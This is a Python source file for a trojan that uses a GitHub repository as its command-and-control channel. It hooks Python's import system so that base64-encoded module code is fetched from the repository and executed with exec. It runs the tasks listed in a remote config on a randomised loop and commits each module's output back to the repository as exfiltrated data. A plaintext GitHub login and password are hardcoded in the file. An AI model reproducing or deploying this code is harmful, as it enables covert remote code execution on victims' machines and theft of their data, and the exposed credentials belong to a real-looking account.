import json
import base64
import sys
import time
import imp
import random
import threading
import os
import queue
from github3 import git

from github3 import login

trojan_id = "abc"

trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_module = []
configured = False
task_queue = queue.Queue()


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print(" attempting to retentive %s", fullname)
            new_library = get_file_contents("module/%s" % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    store_module_result(result)
    return


def connect_to_github():
    gh = login(username="asssassing6@gmail.com", password="mustafa0909250601")
    repo = gh.repository("mustafa-hamden", "torjan")
    branch = repo.branch("master")
    # branch = repo.branch("master")
    return gh, repo, branch


def get_file_contents(filepath):
    gh, rep, branch = connect_to_github()
    tree = branch.Tree.recurse()
    # tree = branch.commit.commit.tree.recures()

    for filename in tree.tree:

        if filepath in filename.path:
            print("found file path " + filepath)
            blob = rep.blob(filename.__json_data['sha'])
            return blob.content

        return None


def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:

        if task['module'] not in sys.modules:
            exec("import %s " % task["module"])
        return config


def store_module_result(data):
    gh, rep, branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
    rep.create_file(remote_path, "commit massage", base64.b64encode(data))
    return


sys.meta_path = [GitImporter()]

while True:

    if task_queue.empty():

        config = get_trojan_config()

        for task in config:
            t = threading.Thread(target=module_runner, args=
            (task['module']))
            t.start()
            time.sleep(random.randint(1, 10))

        time.sleep(random.randint(1000, 10000))
